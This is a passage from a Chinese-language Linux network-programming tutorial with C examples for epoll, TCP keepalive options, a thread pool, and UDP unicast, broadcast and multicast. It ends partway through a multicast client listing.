ev-&gt;arg); &#125; if ((events[i].events &amp; EPOLLOUT) &amp;&amp; (ev-&gt;events &amp; EPOLLOUT)) &#123; //写就绪事件 ev-&gt;call_back(ev-&gt;fd, events[i].events, ev-&gt;arg); &#125; &#125; &#125; /* 退出前释放所有资源 */ return 0;&#125; 心跳包和乒乓包 心跳包: ​ 在应用层自定义一个协议。例如服务器每隔一段时间发送一个123的数据包，客户端收到后会回一个456的数据包，当服务器收到客户端发送来的456之后就认为客户端还保持连接，如果服务器发送了123之后没有得到客户端的回应，则每隔3秒持续发送123给客户端，持续发送3次之后还没有得到回应，则认为客户端掉线了，服务端则close(cfd)且让客户端重新连接 乒乓包： ​ 在判别网络通不通的同时还可以携带一些数据。例如：朋友圈的小圆点，客户端每隔一段时间询问有没有动态更新，服务器马上回应有或没有，如果有则回复有，客户端收到后会让小圆点变红 设置TCP属性 SO_KEEPALIVE 保持连接检测对方主机是否崩溃，避免（服务器）永远阻塞于TCP连接的输入。设置该选项后，如果2小时内在此套接口的任一方向都没有数据交换，TCP就自动给对方发一个保持存活探测分节(keepalive probe)。这是一个对方必须响应的TCP分节.它会导致以下三种情况：对方接收一切正常：以期望的ACK响应。2小时后，TCP将发出另一个探测分节。对方已崩溃且已重新启动：以RST响应。套接口的待处理错误被置为ECONNRESET，套接 口本身则被关闭。对方无任何响应：源自berkeley的TCP发送另外8个探测分节，相隔75秒一个，试图得到一个响应。在发出第一个探测分节11分钟 15秒后若仍无响应就放弃。套接口的待处理错误被置为ETIMEOUT，套接口本身则被关闭。如ICMP错误是“host unreachable(主机不可达)”，说明对方主机并没有崩溃，但是不可达，这种情况下待处理错误被置为EHOSTUNREACH。 根据上面的介绍我们可以知道对端以一种非优雅的方式断开连接的时候，我们可以设置SO_KEEPALIVE属性使得我们在2小时以后发现对方的TCP连接是否依然存在。 12keepAlive = 1;setsockopt(listenfd, SOL_SOCKET, SO_KEEPALIVE, (void*)&amp;keepAlive, sizeof(keepAlive)); 如果我们不能接受如此之长的等待时间，从TCP-Keepalive-HOWTO上可以知道一共有两种方式可以设置，一种是修改内核关于网络方面的 配置参数，另外一种就是SOL_TCP字段的TCP_KEEPIDLE， TCP_KEEPINTVL， TCP_KEEPCNT三个选项。 The tcp_keepidle parameter specifies the interval of inactivity that causes TCP to generate a KEEPALIVE transmission for an application that requests them. tcp_keepidle defaults to 14400 (two hours). /*开始首次KeepAlive探测前的TCP空闭时间 */ The tcp_keepintvl parameter specifies the interval between the nine retriesthat are attempted if a KEEPALIVE transmission is not acknowledged. tcp_keep ntvldefaults to 150 (75 seconds). /* 两次KeepAlive探测间的时间间隔 */ The tcp_keepcnt option specifies the maximum number of keepalive probes tobe sent. The value of TCP_KEEPCNT is an integer value between 1 and n, where n s the value of the systemwide tcp_keepcnt parameter. /* 判定断开前的KeepAlive探测次数*/ 1234567int keepIdle = 1000;int keepInterval = 10;int keepCount = 10;Setsockopt(listenfd, SOL_TCP, TCP_KEEPIDLE, (void *)&amp;keepIdle, sizeof(keepIdle));Setsockopt(listenfd, SOL_TCP,TCP_KEEPINTVL, (void *)&amp;keepInterval, sizeof(keepInterval));Setsockopt(listenfd,SOL_TCP, TCP_KEEPCNT, (void *)&amp;keepCount, sizeof(keepCount)); SO_KEEPALIVE设置空闲2小时才发送一个“保持存活探测分节”，不能保证实时检测。对于判断网络断开时间太长，对于需要及时响应的程序不太适应。 当然也可以修改时间间隔参数，但是会影响到所有打开此选项的套接口！关联了完成端口的socket可能会忽略掉该套接字选项。 线程池 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#ifndef __THREADPOOL_H_#define __THREADPOOL_H_typedef struct threadpool_t threadpool_t;/** * @function threadpool_create * @descCreates a threadpool_t object. * @param thr_num thread num * @param max_thr_num max thread size * @param queue_max_size size of the queue. * @return a newly created thread pool or NULL */threadpool_t *threadpool_create(int min_thr_num, int max_thr_num, int queue_max_size);/** * @function threadpool_add * @desc add a new task in the queue of a thread pool * @param pool Thread pool to which add the task. * @param function Pointer to the function that will perform the task. * @param argument Argument to be passed to the function. * @return 0 if all goes well,else -1 */int threadpool_add(threadpool_t *pool, void*(*function)(void *arg), void *arg);/** * @function threadpool_destroy * @desc Stops and destroys a thread pool. * @param pool Thread pool to destroy. * @return 0 if destory success else -1 */int threadpool_destroy(threadpool_t *pool);/** * @desc get the thread num * @pool pool threadpool * @return # of the thread */int threadpool_all_threadnum(threadpool_t *pool);/** * desc get the busy thread num * @param pool threadpool * return # of the busy thread */int threadpool_busy_threadnum(threadpool_t *pool);#endif 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391#include &lt;stdlib.h&gt;#include &lt;pthread.h&gt;#include &lt;unistd.h&gt;#include &lt;assert.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;signal.h&gt;#include &lt;errno.h&gt;#include \"threadpool.h\"#define DEFAULT_TIME 10 /*10s检测一次*/#define MIN_WAIT_TASK_NUM 10 /*如果queue_size &gt; MIN_WAIT_TASK_NUM 添加新的线程到线程池*/ #define DEFAULT_THREAD_VARY 10 /*每次创建和销毁线程的个数*/#define true 1#define false 0typedef struct &#123; void *(*function)(void *); /* 函数指针，回调函数 */ void *arg; /* 上面函数的参数 */&#125; threadpool_task_t; /* 各子线程任务结构体 *//* 描述线程池相关信息 */struct threadpool_t &#123; pthread_mutex_t lock; /* 用于锁住本结构体 */ pthread_mutex_t thread_counter; /* 记录忙状态线程个数de琐 -- busy_thr_num */ pthread_cond_t queue_not_full; /* 当任务队列满时，添加任务的线程阻塞，等待此条件变量 */ pthread_cond_t queue_not_empty; /* 任务队列里不为空时，通知等待任务的线程 */ pthread_t *threads; /* 存放线程池中每个线程的tid。数组 */ pthread_t adjust_tid; /* 存管理线程tid */ threadpool_task_t *task_queue; /* 任务队列 */ int min_thr_num; /* 线程池最小线程数 */ int max_thr_num; /* 线程池最大线程数 */ int live_thr_num; /* 当前存活线程个数 */ int busy_thr_num; /* 忙状态线程个数 */ int wait_exit_thr_num; /* 要销毁的线程个数 */ int queue_front; /* task_queue队头下标 */ int queue_rear; /* task_queue队尾下标 */ int queue_size; /* task_queue队中实际任务数 */ int queue_max_size; /* task_queue队列可容纳任务数上限 */ int shutdown; /* 标志位，线程池使用状态，true或false */&#125;;/** * @function void *threadpool_thread(void *threadpool) * @desc the worker thread * @param threadpool the pool which own the thread */void *threadpool_thread(void *threadpool);/** * @function void *adjust_thread(void *threadpool); * @desc manager thread * @param threadpool the threadpool */void *adjust_thread(void *threadpool);/** * check a thread is alive */int is_thread_alive(pthread_t tid);int threadpool_free(threadpool_t *pool);threadpool_t *threadpool_create(int min_thr_num, int max_thr_num, int queue_max_size)&#123; int i; threadpool_t *pool = NULL; do &#123; if((pool = (threadpool_t *)malloc(sizeof(threadpool_t))) == NULL) &#123; printf(\"malloc threadpool fail\"); break;/*跳出do while*/ &#125; pool-&gt;min_thr_num = min_thr_num; pool-&gt;max_thr_num = max_thr_num; pool-&gt;busy_thr_num = 0; pool-&gt;live_thr_num = min_thr_num; /* 活着的线程数 初值=最小线程数 */ pool-&gt;queue_size = 0; /* 有0个产品 */ pool-&gt;queue_max_size = queue_max_size; pool-&gt;queue_front = 0; pool-&gt;queue_rear = 0; pool-&gt;shutdown = false; /* 不关闭线程池 */ /* 根据最大线程上限数， 给工作线程数组开辟空间, 并清零 */ pool-&gt;threads = (pthread_t *)malloc(sizeof(pthread_t)*max_thr_num); if (pool-&gt;threads == NULL) &#123; printf(\"malloc threads fail\"); break; &#125; memset(pool-&gt;threads, 0, sizeof(pthread_t)*max_thr_num); /* 队列开辟空间 */ pool-&gt;task_queue = (threadpool_task_t *)malloc(sizeof(threadpool_task_t)*queue_max_size); if (pool-&gt;task_queue == NULL) &#123; printf(\"malloc task_queue fail\"); break; &#125; /* 初始化互斥琐、条件变量 */ if (pthread_mutex_init(&amp;(pool-&gt;lock), NULL) != 0 || pthread_mutex_init(&amp;(pool-&gt;thread_counter), NULL) != 0 || pthread_cond_init(&amp;(pool-&gt;queue_not_empty), NULL) != 0 || pthread_cond_init(&amp;(pool-&gt;queue_not_full), NULL) != 0) &#123; printf(\"init the lock or cond fail\"); break; &#125; /* 启动 min_thr_num 个 work thread */ for (i = 0; i &lt; min_thr_num; i++) &#123; pthread_create(&amp;(pool-&gt;threads[i]), NULL, threadpool_thread, (void *)pool);/*pool指向当前线程池*/ printf(\"start thread 0x%x...\\n\", (unsigned int)pool-&gt;threads[i]); &#125; pthread_create(&amp;(pool-&gt;adjust_tid), NULL, adjust_thread, (void *)pool);/* 启动管理者线程 */ return pool; &#125; while (0); threadpool_free(pool); /* 前面代码调用失败时，释放poll存储空间 */ return NULL;&#125;/* 向线程池中 添加一个任务 */int threadpool_add(threadpool_t *pool, void*(*function)(void *arg), void *arg)&#123; pthread_mutex_lock(&amp;(pool-&gt;lock)); /* ==为真，队列已经满， 调wait阻塞 */ while ((pool-&gt;queue_size == pool-&gt;queue_max_size) &amp;&amp; (!pool-&gt;shutdown)) &#123; pthread_cond_wait(&amp;(pool-&gt;queue_not_full), &amp;(pool-&gt;lock)); &#125; if (pool-&gt;shutdown) &#123; pthread_mutex_unlock(&amp;(pool-&gt;lock)); &#125; /* 清空 工作线程 调用的回调函数 的参数arg */ if (pool-&gt;task_queue[pool-&gt;queue_rear].arg != NULL) &#123; free(pool-&gt;task_queue[pool-&gt;queue_rear].arg); pool-&gt;task_queue[pool-&gt;queue_rear].arg = NULL; &#125; /*添加任务到任务队列里*/ pool-&gt;task_queue[pool-&gt;queue_rear].function = function; pool-&gt;task_queue[pool-&gt;queue_rear].arg = arg; pool-&gt;queue_rear = (pool-&gt;queue_rear + 1) % pool-&gt;queue_max_size; /* 队尾指针移动, 模拟环形 */ pool-&gt;queue_size++; /*添加完任务后，队列不为空，唤醒线程池中 等待处理任务的线程*/ pthread_cond_signal(&amp;(pool-&gt;queue_not_empty)); pthread_mutex_unlock(&amp;(pool-&gt;lock)); return 0;&#125;/* 线程池中各个工作线程 */void *threadpool_thread(void *threadpool)&#123; threadpool_t *pool = (threadpool_t *)threadpool; threadpool_task_t task; while (true) &#123; /* Lock must be taken to wait on conditional variable */ /*刚创建出线程，等待任务队列里有任务，否则阻塞等待任务队列里有任务后再唤醒接收任务*/ pthread_mutex_lock(&amp;(pool-&gt;lock)); /*queue_size == 0 说明没有任务，调 wait 阻塞在条件变量上, 若有任务，跳过该while*/ while ((pool-&gt;queue_size == 0) &amp;&amp; (!pool-&gt;shutdown)) &#123; printf(\"thread 0x%x is waiting\\n\", (unsigned int)pthread_self()); pthread_cond_wait(&amp;(pool-&gt;queue_not_empty), &amp;(pool-&gt;lock)); /*清除指定数目的空闲线程，如果要结束的线程个数大于0，结束线程*/ if (pool-&gt;wait_exit_thr_num &gt; 0) &#123; pool-&gt;wait_exit_thr_num--; /*如果线程池里线程个数大于最小值时可以结束当前线程*/ if (pool-&gt;live_thr_num &gt; pool-&gt;min_thr_num) &#123; printf(\"thread 0x%x is exiting\\n\", (unsigned int)pthread_self()); pool-&gt;live_thr_num--; pthread_mutex_unlock(&amp;(pool-&gt;lock)); pthread_exit(NULL); &#125; &#125; &#125; /*如果指定了true，要关闭线程池里的每个线程，自行退出处理*/ if (pool-&gt;shutdown) &#123; pthread_mutex_unlock(&amp;(pool-&gt;lock)); printf(\"thread 0x%x is exiting\\n\", (unsigned int)pthread_self()); pthread_exit(NULL); /* 线程自行结束 */ &#125; /*从任务队列里获取任务, 是一个出队操作*/ task.function = pool-&gt;task_queue[pool-&gt;queue_front].function; task.arg = pool-&gt;task_queue[pool-&gt;queue_front].arg; pool-&gt;queue_front = (pool-&gt;queue_front + 1) % pool-&gt;queue_max_size; /* 出队，模拟环形队列 */ pool-&gt;queue_size--; /*通知可以有新的任务添加进来*/ pthread_cond_broadcast(&amp;(pool-&gt;queue_not_full)); /*任务取出后，立即将 线程池琐 释放*/ pthread_mutex_unlock(&amp;(pool-&gt;lock)); /*执行任务*/ printf(\"thread 0x%x start working\\n\", (unsigned int)pthread_self()); pthread_mutex_lock(&amp;(pool-&gt;thread_counter)); /*忙状态线程数变量琐*/ pool-&gt;busy_thr_num++; /*忙状态线程数+1*/ pthread_mutex_unlock(&amp;(pool-&gt;thread_counter)); (*(task.function))(task.arg); /*执行回调函数任务*/ //task.function(task.arg); /*执行回调函数任务*/ /*任务结束处理*/ printf(\"thread 0x%x end working\\n\", (unsigned int)pthread_self()); pthread_mutex_lock(&amp;(pool-&gt;thread_counter)); pool-&gt;busy_thr_num--; /*处理掉一个任务，忙状态数线程数-1*/ pthread_mutex_unlock(&amp;(pool-&gt;thread_counter)); &#125; pthread_exit(NULL);&#125;/* 管理线程 */void *adjust_thread(void *threadpool)&#123; int i; threadpool_t *pool = (threadpool_t *)threadpool; while (!pool-&gt;shutdown) &#123; sleep(DEFAULT_TIME); /*定时 对线程池管理*/ pthread_mutex_lock(&amp;(pool-&gt;lock)); int queue_size = pool-&gt;queue_size; /* 关注 任务数 */ int live_thr_num = pool-&gt;live_thr_num; /* 存活 线程数 */ pthread_mutex_unlock(&amp;(pool-&gt;lock)); pthread_mutex_lock(&amp;(pool-&gt;thread_counter)); int busy_thr_num = pool-&gt;busy_thr_num; /* 忙着的线程数 */ pthread_mutex_unlock(&amp;(pool-&gt;thread_counter)); /* 创建新线程 算法： 任务数大于最小线程池个数, 且存活的线程数少于最大线程个数时 如：30&gt;=10 &amp;&amp; 40&lt;100*/ if (queue_size &gt;= MIN_WAIT_TASK_NUM &amp;&amp; live_thr_num &lt; pool-&gt;max_thr_num) &#123; pthread_mutex_lock(&amp;(pool-&gt;lock)); int add = 0; /*一次增加 DEFAULT_THREAD 个线程*/ for (i = 0; i &lt; pool-&gt;max_thr_num &amp;&amp; add &lt; DEFAULT_THREAD_VARY &amp;&amp; pool-&gt;live_thr_num &lt; pool-&gt;max_thr_num; i++) &#123; if (pool-&gt;threads[i] == 0 || !is_thread_alive(pool-&gt;threads[i])) &#123; pthread_create(&amp;(pool-&gt;threads[i]), NULL, threadpool_thread, (void *)pool); add++; pool-&gt;live_thr_num++; &#125; &#125; pthread_mutex_unlock(&amp;(pool-&gt;lock)); &#125; /* 销毁多余的空闲线程 算法：忙线程X2 小于 存活的线程数 且 存活的线程数 大于 最小线程数时*/ if ((busy_thr_num * 2) &lt; live_thr_num &amp;&amp; live_thr_num &gt; pool-&gt;min_thr_num) &#123; /* 一次销毁DEFAULT_THREAD个线程, 隨機10個即可 */ pthread_mutex_lock(&amp;(pool-&gt;lock)); pool-&gt;wait_exit_thr_num = DEFAULT_THREAD_VARY; /* 要销毁的线程数 设置为10 */ pthread_mutex_unlock(&amp;(pool-&gt;lock)); for (i = 0; i &lt; DEFAULT_THREAD_VARY; i++) &#123; /* 通知处在空闲状态的线程, 他们会自行终止*/ pthread_cond_signal(&amp;(pool-&gt;queue_not_empty)); &#125; &#125; &#125; return NULL;&#125;//释放所有线程int threadpool_destroy(threadpool_t *pool)&#123; int i; if (pool == NULL) &#123; return -1; &#125; pool-&gt;shutdown = true; /*先销毁管理线程*/ pthread_join(pool-&gt;adjust_tid, NULL); for (i = 0; i &lt; pool-&gt;live_thr_num; i++) &#123; /*通知所有的空闲线程*/ pthread_cond_broadcast(&amp;(pool-&gt;queue_not_empty)); &#125; for (i = 0; i &lt; pool-&gt;live_thr_num; i++) &#123; pthread_join(pool-&gt;threads[i], NULL); &#125; threadpool_free(pool); return 0;&#125;//释放任务队列和所有的锁int threadpool_free(threadpool_t *pool)&#123; if (pool == NULL) &#123; return -1; &#125; if (pool-&gt;task_queue) &#123; free(pool-&gt;task_queue); &#125; if (pool-&gt;threads) &#123; free(pool-&gt;threads); pthread_mutex_lock(&amp;(pool-&gt;lock)); pthread_mutex_destroy(&amp;(pool-&gt;lock)); pthread_mutex_lock(&amp;(pool-&gt;thread_counter)); pthread_mutex_destroy(&amp;(pool-&gt;thread_counter)); pthread_cond_destroy(&amp;(pool-&gt;queue_not_empty)); pthread_cond_destroy(&amp;(pool-&gt;queue_not_full)); &#125; free(pool); pool = NULL; return 0;&#125;//获取所有活着的线程数int threadpool_all_threadnum(threadpool_t *pool)&#123; int all_threadnum = -1; pthread_mutex_lock(&amp;(pool-&gt;lock)); all_threadnum = pool-&gt;live_thr_num; pthread_mutex_unlock(&amp;(pool-&gt;lock)); return all_threadnum;&#125;//获取忙碌的线程数int threadpool_busy_threadnum(threadpool_t *pool)&#123; int busy_threadnum = -1; pthread_mutex_lock(&amp;(pool-&gt;thread_counter)); busy_threadnum = pool-&gt;busy_thr_num; pthread_mutex_unlock(&amp;(pool-&gt;thread_counter)); return busy_threadnum;&#125;//判断线程是否活着int is_thread_alive(pthread_t tid)&#123; int kill_rc = pthread_kill(tid, 0); //发0号信号，测试线程是否存活 if (kill_rc == ESRCH) &#123; return false; &#125; return true;&#125;/*测试*/ #if 1/* 线程池中的线程，模拟处理业务 */void *process(void *arg)&#123; printf(\"thread 0x%x working on task %d\\n \",(unsigned int)pthread_self(),*(int *)arg); sleep(1); printf(\"task %d is end\\n\",*(int *)arg); return NULL;&#125;int main(void)&#123; /*threadpool_t *threadpool_create(int min_thr_num, int max_thr_num, int queue_max_size);*/ threadpool_t *thp = threadpool_create(3,100,100);/*创建线程池，池里最小3个线程，最大100，队列最大100*/ printf(\"pool inited\"); //int *num = (int *)malloc(sizeof(int)*20); int num[20], i; for (i = 0; i &lt; 20; i++) &#123; num[i]=i; printf(\"add task %d\\n\",i); threadpool_add(thp, process, (void*)&amp;num[i]); /* 向线程池中添加任务 */ &#125; sleep(10); /* 等子线程完成任务 */ threadpool_destroy(thp); return 0;&#125;#endif UDP服务器 无连接的不可靠报文传递 无需创建连接，所以UDP开销较小，数据传输速度快，实时性较强。 多用于对实时性要求较高的通信场合，如视频会议、电话会议等 缺点：数据传输不可靠，传输数据的正确率、传输顺序和流量都得不到控制和保证。 使用UDP协议进行数据传输，为保证数据的正确性，我们需要在应用层添加辅助校验协议来弥补UDP的不足，以达到数据可靠传输的目的。 UDP也有可能出现缓冲区被填满后，再接收数据时丢包的现象。由于它没有TCP滑动窗口的机制，通常采用如下两种方法解决： 服务器应用层设计流量控制，控制发送数据速度。 借助setsockopt函数改变接收缓冲区大小。如： 1234#include &lt;sys/socket.h&gt;int setsockopt(int sockfd, int level, int optname, const void *optval, socklen_t optlen); int n = 220x1024 setsockopt(sockfd, SOL_SOCKET, SO_RCVBUF, &amp;n, sizeof(n)); C/S模型-UDP 由于UDP不需要维护连接，程序逻辑简单了很多，但是UDP协议是不可靠的，保证通讯可靠性的机制需要在应用层实现。 sendto 1int sendto(int s, const void *buf, int len, unsigned int flags, const struct sockaddr *to, int tolen); 返回值说明： 成功则返回实际传送出去的字符数，失败返回-1，错误原因会存于errno 中。 参数说明： s： socket描述符； buf： UDP数据报缓存区（包含待发送数据）； len： UDP数据报的长度； flags：调用方式标志位（一般设置为0）； to： 指向接收数据的主机地址信息的结构体（sockaddr_in需类型转换）； tolen：to所指结构体的长度； recvfrom 1int recvfrom(int s, void *buf, int len, unsigned int flags,struct sockaddr *from, int *fromlen); 返回值说明： 成功则返回实际接收到的字符数，失败返回-1，错误原因会存于errno 中。 参数说明： s： socket描述符； buf： UDP数据报缓存区（包含所接收的数据）； len： 缓冲区长度。 flags： 调用操作方式（一般设置为0）。 from： 指向发送数据的客户端地址信息的结构体（sockaddr_in需类型转换）； fromlen：指针，指向from结构体长度值。 Server.c 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;ctype.h&gt;#define SERV_PORT 8000int main(void)&#123; struct sockaddr_in serv_addr, clie_addr; socklen_t clie_addr_len; int sockfd; char buf[BUFSIZ]; char str[INET_ADDRSTRLEN]; int i, n; sockfd = socket(AF_INET, SOCK_DGRAM, 0); bzero(&amp;serv_addr, sizeof(serv_addr)); serv_addr.sin_family = AF_INET; serv_addr.sin_addr.s_addr = htonl(INADDR_ANY); serv_addr.sin_port = htons(SERV_PORT); bind(sockfd, (struct sockaddr *)&amp;serv_addr, sizeof(serv_addr)); printf(\"Accepting connections ...\\n\"); while (1) &#123; clie_addr_len = sizeof(clie_addr); n = recvfrom(sockfd, buf, BUFSIZ,0, (struct sockaddr *)&amp;clie_addr, &amp;clie_addr_len); if (n == -1) perror(\"recvfrom error\"); printf(\"received from %s at PORT %d\\n\", inet_ntop(AF_INET, &amp;clie_addr.sin_addr, str, sizeof(str)), ntohs(clie_addr.sin_port)); for (i = 0; i &lt; n; i++) buf[i] = toupper(buf[i]); n = sendto(sockfd, buf, n, 0, (struct sockaddr *)&amp;clie_addr, sizeof(clie_addr)); if (n == -1) perror(\"sendto error\"); &#125; close(sockfd); return 0;&#125; Client.c 12345678910111213141516171819202122232425262728293031323334353637#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;ctype.h&gt;#define SERV_PORT 8000int main(int argc, char *argv[])&#123; struct sockaddr_in servaddr; int sockfd, n; char buf[BUFSIZ]; sockfd = socket(AF_INET, SOCK_DGRAM, 0); bzero(&amp;servaddr, sizeof(servaddr)); servaddr.sin_family = AF_INET; inet_pton(AF_INET, \"127.0.0.1\", &amp;servaddr.sin_addr); servaddr.sin_port = htons(SERV_PORT); while (fgets(buf, BUFSIZ, stdin) != NULL) &#123; n = sendto(sockfd, buf, strlen(buf), 0, (struct sockaddr *)&amp;servaddr, sizeof(servaddr)); if (n == -1) perror(\"sendto error\"); n = recvfrom(sockfd, buf, BUFSIZ, 0, NULL, 0); //NULL:不关心对端信息 if (n == -1) perror(\"recvfrom error\"); write(STDOUT_FILENO, buf, n); &#125; close(sockfd); return 0;&#125; UDP实现广播 IP：192.168.42.255(广播) IP：192.168.42.1(网关) 广播需要设置套接字开启广播功能 int flag = 1; setsockopt(sockfd, SOL_SOCKET, SO_BROADCAST, &amp;flag, sizeof(flag)); 给sockfd开放广播权限。 客户端需要绑定端口号 server 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/socket.h&gt;#include &lt;string.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;net/if.h&gt;#define SERVER_PORT 8000 /* 无关紧要 */#define MAXLINE 1500#define BROADCAST_IP \"192.168.42.255\"#define CLIENT_PORT 9000 /* 重要 */int main(void)&#123; int sockfd; struct sockaddr_in serveraddr, clientaddr; char buf[MAXLINE]; /* 构造用于UDP通信的套接字 */ sockfd = socket(AF_INET, SOCK_DGRAM, 0); bzero(&amp;serveraddr, sizeof(serveraddr)); serveraddr.sin_family = AF_INET; /* IPv4 */ serveraddr.sin_addr.s_addr = htonl(INADDR_ANY); /* 本地任意IP INADDR_ANY = 0 */ serveraddr.sin_port = htons(SERVER_PORT); bind(sockfd, (struct sockaddr *)&amp;serveraddr, sizeof(serveraddr)); //开启广播权限 int flag = 1; setsockopt(sockfd, SOL_SOCKET, SO_BROADCAST, &amp;flag, sizeof(flag)); /*构造 client 地址 IP+端口 192.168.7.255+9000 */ bzero(&amp;clientaddr, sizeof(clientaddr)); clientaddr.sin_family = AF_INET; inet_pton(AF_INET, BROADCAST_IP, &amp;clientaddr.sin_addr.s_addr); clientaddr.sin_port = htons(CLIENT_PORT); int i = 0; while (1) &#123; sprintf(buf, \"Drink %d glasses of water\\n\", i++); //fgets(buf, sizeof(buf), stdin); sendto(sockfd, buf, strlen(buf), 0, (struct sockaddr *)&amp;clientaddr, sizeof(clientaddr)); sleep(1); &#125; close(sockfd); return 0;&#125; Client 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;sys/socket.h&gt;#include &lt;arpa/inet.h&gt;#define SERVER_PORT 8000#define MAXLINE 4096#define CLIENT_PORT 9000int main(int argc, char *argv[])&#123; struct sockaddr_in localaddr; int confd; ssize_t len; char buf[MAXLINE]; //1.创建一个socket confd = socket(AF_INET, SOCK_DGRAM, 0); //2.初始化本地端地址 bzero(&amp;localaddr, sizeof(localaddr)); localaddr.sin_family = AF_INET; inet_pton(AF_INET, \"0.0.0.0\" , &amp;localaddr.sin_addr.s_addr); localaddr.sin_port = htons(CLIENT_PORT); int ret = bind(confd, (struct sockaddr *)&amp;localaddr, sizeof(localaddr)); //显示绑定不能省略 if (ret == 0) printf(\"...bind ok...\\n\"); while (1) &#123; len = recvfrom(confd, buf, sizeof(buf), 0, NULL, 0); write(STDOUT_FILENO, buf, len); &#125; close(confd); return 0;&#125; 组播 广播是把数据报发送给所有的机器,容易造成广播风暴，所以推荐使用组播 组播组可以是永久的也可以是临时的。组播组地址中，有一部分由官方分配的，称为永久组播组。永久组播组保持不变的是它的ip地址，组中的成员构成可以发生变化。永久组播组中成员的数量都可以是任意的，甚至可以为零。那些没有保留下来供永久组播组使用的ip组播地址，可以被临时组播组利用。 1234224.0.0.0～224.0.0.255 为预留的组播地址（永久组地址），地址224.0.0.0保留不做分配，其它地址供路由协议使用；224.0.1.0～224.0.1.255 是公用组播地址，可以用于Internet；欲使用需申请。224.0.2.0～238.255.255.255 为用户可用的组播地址（临时组地址），全网范围内有效；239.0.0.0～239.255.255.255 为本地管理组播地址，仅在特定的本地范围内有效。（局域网使用） 可使用ip ad命令查看网卡编号，如： 1234567891011itcast$ ip ad1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever2: eth0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc pfifo_fast state DOWN group default qlen 1000 link/ether 00:0c:29:0a:c4:f4 brd ff:ff:ff:ff:ff:ff inet6 fe80::20c:29ff:fe0a:c4f4/64 scope link valid_lft forever preferred_lft forever eth0网卡的编号是2 if_nametoindex函数可以根据网卡名，获取网卡序号。 1unsigned int if_nametoindex(const char *ifname); //传递网卡名字 Server.c 服务端要开启组播权限 1234567#define GROUP &quot;239.0.0.2&quot;struct ip_mreqn group;inet_pton(AF_INET, GROUP, &amp;group.imr_multiaddr); /* 设置组地址 */inet_pton(AF_INET, &quot;0.0.0.0&quot;, &amp;group.imr_address); /* 本地任意IP */group.imr_ifindex = if_nametoindex(&quot;eth0&quot;); /* 给出网卡名,转换为对应编号: eth0 --&gt; 编号 命令:ip ad */setsockopt(sockfd, IPPROTO_IP, IP_MULTICAST_IF, &amp;group, sizeof(group)); /* 组播权限 */ 查看ip_mreqn结构体 1234567sudo grep -r &quot;ip_mreqn&quot; /usr/ -nstruct ip_mreqn &#123; struct in_addr imr_multiaddr; /* IP multicast address of group 组地址*/ struct in_addr imr_address; /* local IP address of interface 本地ip*/ int imr_ifindex; /* Interface index 网卡编号*/ &#125;; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;net/if.h&gt;#define SERVER_PORT 8000#define CLIENT_PORT 9000#define MAXLINE 1500#define GROUP \"239.0.0.2\"int main(void)&#123; int sockfd; struct sockaddr_in serveraddr, clientaddr; char buf[MAXLINE] = \"itcast\\n\"; struct ip_mreqn group; sockfd = socket(AF_INET, SOCK_DGRAM, 0); /* 构造用于UDP通信的套接字 */ bzero(&amp;serveraddr, sizeof(serveraddr)); serveraddr.sin_family = AF_INET; /* IPv4 */ serveraddr.sin_addr.s_addr = htonl(INADDR_ANY); /* 本地任意IP INADDR_ANY = 0 */ serveraddr.sin_port = htons(SERVER_PORT); bind(sockfd, (struct sockaddr *)&amp;serveraddr, sizeof(serveraddr)); inet_pton(AF_INET, GROUP, &amp;group.imr_multiaddr); /* 设置组地址 */ inet_pton(AF_INET, \"0.0.0.0\", &amp;group.imr_address); /* 本地任意IP */ group.imr_ifindex = if_nametoindex(\"eth0\"); /* 给出网卡名,转换为对应编号: eth0 --&gt; 编号 命令:ip ad */ setsockopt(sockfd, IPPROTO_IP, IP_MULTICAST_IF, &amp;group, sizeof(group)); /* 组播权限 */ bzero(&amp;clientaddr, sizeof(clientaddr)); /* 构造 client 地址 IP+端口 */ clientaddr.sin_family = AF_INET; inet_pton(AF_INET, GROUP, &amp;clientaddr.sin_addr.s_addr); /* IPv4 239.0.0.2+9000 */ clientaddr.sin_port = htons(CLIENT_PORT); int i = 0; while (1) &#123; sprintf(buf, \"itcast %d\\n\", i++); //fgets(buf, sizeof(buf), stdin); sendto(sockfd, buf, strlen(buf), 0, (struct sockaddr *)&amp;clientaddr, sizeof(clientaddr)); sleep(1); &#125; close(sockfd); return 0;&#125; client.c 客户端要加入组播 1234567#define GROUP &quot;239.0.0.2&quot;inet_pton(AF_INET, GROUP, &amp;group.imr_multiaddr); /* 设置组地址 